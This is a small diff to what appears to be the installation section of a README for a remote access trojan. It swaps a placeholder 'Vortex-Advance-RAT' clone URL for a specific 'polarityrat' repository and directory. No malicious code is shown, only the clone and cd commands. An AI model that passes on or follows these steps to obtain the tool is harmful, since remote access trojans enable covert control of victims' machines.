@@ -38,8 +38,8 @@ Download and install **Python 3.8+** from [python.org](https://www.python.org/do
 ### Step 2 — Clone the Repository
 
 ```bash
-git clone https://github.com/YourUsername/Vortex-Advance-RAT.git
-cd Vortex-Advance-RAT
+git clone https://github.com/gtapiGOtLOXP/polarityrat.git
+cd polarityrat
 ```
 
 ### Step 3 — Install Dependencies
